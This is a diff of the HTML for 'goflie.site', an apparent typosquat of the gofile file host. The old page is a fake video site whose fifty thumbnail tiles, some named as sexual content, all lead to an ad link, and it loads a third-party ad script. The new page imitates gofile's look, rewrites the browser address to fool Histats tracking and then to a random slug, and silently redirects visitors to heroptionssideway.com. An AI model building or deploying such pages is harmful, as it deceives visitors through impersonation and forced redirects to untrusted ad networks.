@@ -1,226 +1,164 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="id">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>goflie.site</title>
+  <style>
+    * { box-sizing: border-box; }
 
-<title>goflie.site</title>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #1f2a3a; /* dark blue ala gofile */
+      display: flex;
+      flex-direction: column;
+      color: #94a3b8;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
 
-<style>
-body {
-  margin: 0;
-  background: #111;
-  color: #fff;
-  font-family: Arial, sans-serif;
-}
+    /* HEADER */
+    header {
+      height: 56px;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      background: #1b2533;
+    }
 
-.container {
-  max-width: 900px;
-  margin: auto;
-  padding: 15px;
-}
+    .menu-btn {
+      width: 36px;
+      height: 36px;
+      border-radius: 6px;
+      background: #2563eb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-.player-box iframe {
-  width: 100%;
-  height: 230px;
-  border: 0;
-  border-radius: 6px;
-  background: #000;
-}
+    .menu-btn span,
+    .menu-btn span::before,
+    .menu-btn span::after {
+      content: '';
+      display: block;
+      width: 16px;
+      height: 2px;
+      background: #fff;
+      position: relative;
+    }
 
-.section-title {
-  font-size: 18px;
-  font-weight: bold;
-  margin: 20px 0 10px;
-}
+    .menu-btn span::before { top: -5px; position: absolute; }
+    .menu-btn span::after { top: 5px; position: absolute; }
 
-.grid {
-  display: grid;
-  grid-template-columns: repeat(2, 1fr);
-  gap: 10px;
-}
+    /* MAIN */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-.item {
-  background: #1a1a1a;
-  border-radius: 5px;
-  overflow: hidden;
-  text-decoration: none;
-  color: white;
-}
+    /* GOFILE-LIKE SPINNER */
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      border: 5px solid transparent;
+      border-top-color: #3b82f6;
+      border-right-color: #3b82f6;
+      animation: spin 1s linear infinite;
+    }
 
-.item img {
-  width: 100%;
-  display: block;
-}
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
-.caption {
-  padding: 6px;
-  font-size: 14px;
-  height: 35px;
-  overflow: hidden;
-}
-/* Rainbow Gradient Animation */
-.rainbow {
-  font-size: 26px;
-  font-weight: bold;
-  text-align: center;
-  margin: 20px 0 15px;
-  background: linear-gradient(
-    90deg,
-    #ff0000,
-    #ff7a00,
-    #ffff00,
-    #00ff00,
-    #00ffff,
-    #0000ff,
-    #8b00ff
-  );
-  background-size: 400%;
-  -webkit-background-clip: text;
-  color: transparent;
-  animation: rainbowFlow 6s linear infinite, fadeSlide 1.2s ease-out forwards;
-  opacity: 0;
-}
+    /* FOOTER */
+    footer {
+      padding: 20px 0 30px;
+      text-align: center;
+      font-size: 14px;
+      background: #1b2533;
+    }
 
-/* Gradient Flow Animation */
-@keyframes rainbowFlow {
-  0% { background-position: 0% }
-  100% { background-position: 400% }
-}
-
-/* Fade + Slide-in */
-@keyframes fadeSlide {
-  0% {
-    opacity: 0;
-    transform: translateY(-15px);
-  }
-  100% {
-    opacity: 1;
-    transform: translateY(0);
-  }
-}
-
+    footer a {
+      display: block;
+      color: #94a3b8;
+      text-decoration: none;
+      margin: 6px 0;
+    }
   </style>
 </head>
-
 <body>
-  
-<h1 class="page-title rainbow">Streaming Video Online</h1>
 
-<div class="container">
+  <header>
+    <div class="menu-btn"><span></span></div>
+  </header>
 
-  <!-- PLAYER -->
-  <div class="player-box">
-    <iframe id="videoframe" allowfullscreen></iframe>
-  </div>
+    <main id="content">
+    <div class="spinner" id="spinner"></div>
+  </main>
 
-  <!-- RELATED -->
-  <div class="section-title">Related Videos</div>
-  <div class="grid" id="relatedGrid"></div>
+  <footer>
+    <a href="#">Home</a>
+    <a href="#">Terms of Service</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Copyright</a>
+  </footer>
 
-</div>
-
-<script>
-/* ===============================
-   1. AMBIL VIDEO ID DARI URL
-   =============================== */
-
-const url = new URL(window.location.href);
-let videoID = url.searchParams.get("id");
-if (!videoID) videoID = "284e1fcb-5bc3-4c95-86e8-f6ab8153b676";
-
-document.getElementById("videoframe").src =
-  "https://app.videas.fr/embed/media/" + videoID + "/?autoplay=true";
-
-
-/* ===============================
-   2. THUMBNAIL POSTIMAGE
-   =============================== */
-/*
- Contoh format Postimage:
- https://i.postimg.cc/XXXXXXXX/filename.jpg
-*/
-
-const thumbs = [
-  "https://i.postimg.cc/yYtPY3yf/IMG_20251017_235206.jpg",
-  "https://i.postimg.cc/Y28zsDZC/IMG_20251013_175127.jpg",
-  "https://i.postimg.cc/Fzx40JZL/Picsart_25-10-12_12-20-14-931.jpg",
-  "https://i.postimg.cc/MGzvHVhL/IMG_20251007_142755.jpg",
-  "https://i.postimg.cc/s2ps1jB9/Picsart_25-10-19_00-47-33-444.jpg",
-  "https://i.postimg.cc/XYC9DnHz/couple_sex_001_282.gif",
-  "https://i.postimg.cc/52HVTQ67/IMG_20251030_161853.jpg",
-  "https://i.postimg.cc/dt0sZpFN/couple_sex_001_299.gif",
-  "https://i.postimg.cc/kXXsPMhs/thumb1_1.jpg",
-  // Tambah terus sampai 50 (boleh lebih)
-];
-
-/* Jika thumbnail kurang dari 50 → auto repeat */
-function getThumb(i) {
-  return thumbs[i % thumbs.length];
-}
-
-
-/* ===============================
-   3. DIRECT LINK ADSTERRA
-   =============================== */
-const adLink = "http://www.goflie.site/s";
-
-
-/* ===============================
-   4. GENERATE 50 RELATED
-   =============================== */
-const grid = document.getElementById("relatedGrid");
-
-for (let i = 0; i < 50; i++) {
-
-  const item = `
-    <a class="item" href="${adLink}" target="_blank">
-      <img src="${getThumb(i)}">
-      <div class="caption">Video ${i + 1}</div>
-    </a>
-  `;
-
-  grid.innerHTML += item;
-}
-</script>
-   <!-- 📊 Histats Tracking -->
-
-  <script type="text/javascript">
-
-    var _Hasync = _Hasync || [];
-
-    _Hasync.push(['Histats.start', '1,5001963,4,0,0,0,00000000']);
-
-    _Hasync.push(['Histats.fasi', '1']);
-
-    _Hasync.push(['Histats.track_hits', '']);
-
-    (function() {
-
-      var hs = document.createElement('script');
-
-      hs.type = 'text/javascript';
-
-      hs.async = true;
-
-      hs.src = ('//s10.histats.com/js15_as.js');
-
-      (document.head || document.body).appendChild(hs);
-
-    })();
-
+  <script>
+    // spinner tampil 2 detik lalu hilang
+    setTimeout(() => {
+      const spinner = document.getElementById('spinner');
+      spinner.style.opacity = '0';
+      spinner.style.transition = 'opacity 0.3s ease';
+    }, 2000);
   </script>
 
-  <noscript>
+<!-- ===== HISTATS (PAKSA ROOT) ===== -->
+<script>
+/* paksa Histats selalu baca ROOT */
+history.replaceState(null, "", "/");
+document.title = "goflie.site";
 
-    <a href="/" target="_blank">
+/* cegah double hit */
+if (!sessionStorage.getItem("histats_hit")) {
+  sessionStorage.setItem("histats_hit", "1");
 
-      <img src="//sstatic1.histats.com/0.gif?5001963&101" alt="hit counter" border="0">
+  var _Hasync = _Hasync || [];
+  _Hasync.push(['Histats.start','1,4978236,4,0,0,0,00000000']);
+  _Hasync.push(['Histats.fasi','1']);
+  _Hasync.push(['Histats.track_hits','']);
 
-    </a>
+  (function() {
+    var hs = document.createElement('script');
+    hs.async = true;
+    hs.src = '//s10.histats.com/js15_as.js';
+    document.body.appendChild(hs);
+  })();
+}
+</script>
+<!-- ===== END HISTATS ===== -->
 
-  </noscript>
+<script>
+/* tampilkan slug random SETELAH Histats */
+setTimeout(() => {
+  const c = "abcdefghijklmnopqrstuvwxyz0123456789";
+  let slug = "";
+  for (let i = 0; i < 4; i++) {
+    slug += c[Math.floor(Math.random() * c.length)];
+  }
+  history.replaceState(null, "", "/" + slug);
+}, 200);
 
- <script src="https://heroptionssideway.com/da/66/8b/da668bfc7ad11cc915ef786e8ad07e45.js"></script>
+/* redirect */
+setTimeout(() => {
+  document.body.classList.add("fade-out");
+  setTimeout(() => {
+    location.href = "https://heroptionssideway.com/ekgerpjzfe?key=53fdd524b77ca3c378b16cbc54e32da1";
+  }, 600);
+}, 800);
+</script>
 
 </body>
-</html>
+  </html>
